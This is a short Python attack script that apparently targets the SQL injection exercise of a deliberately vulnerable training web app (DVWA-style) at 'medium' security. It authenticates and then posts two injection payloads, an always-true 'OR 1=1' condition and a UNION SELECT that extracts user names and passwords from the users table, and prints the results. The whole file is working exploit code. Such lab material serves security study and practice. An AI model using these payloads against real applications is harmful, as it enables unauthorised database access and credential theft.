#!/usr/bin/env python3

import requests
import urllib3
from bs4 import BeautifulSoup

from conf import URL
from conf import USERNAME
from conf import PASSWORD
from conf import PHP_ID

from util import get_auth_cookie

PAYLOADS = [
    "1 OR 1=1 -- ",
    "1 UNION SELECT first_name, password FROM users -- "
]

# -----------------------

def sqli_medium(base_url, payloads):
    global PHP_ID
    
    if not PHP_ID:
        PHP_ID = get_auth_cookie(URL, USERNAME, PASSWORD)
    
    url = base_url + "/vulnerabilities/sqli/"
    difficulty = "medium"
    custom_headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": f"PHPSESSID={PHP_ID}; security={difficulty}"
    }
    
    for payload in payloads:
        post_data = f"id={payload}&Submit=Submit"

        r = requests.post(url, headers=custom_headers, data=post_data)
        soup = BeautifulSoup(r.text, "html.parser")
        div = soup.find("div", {"class": "vulnerable_code_area"})

        if not div:
            print("==================================")            
            print(f"[ERROR]")
            print()
            print(f"payload = `{payload}`")
            print()
            print(f"error_msg = `{r.text}`")
        else:
            print("==================================")            
            print(f"[SUCCESS]")
            print()
            print(div.find_all("pre"))
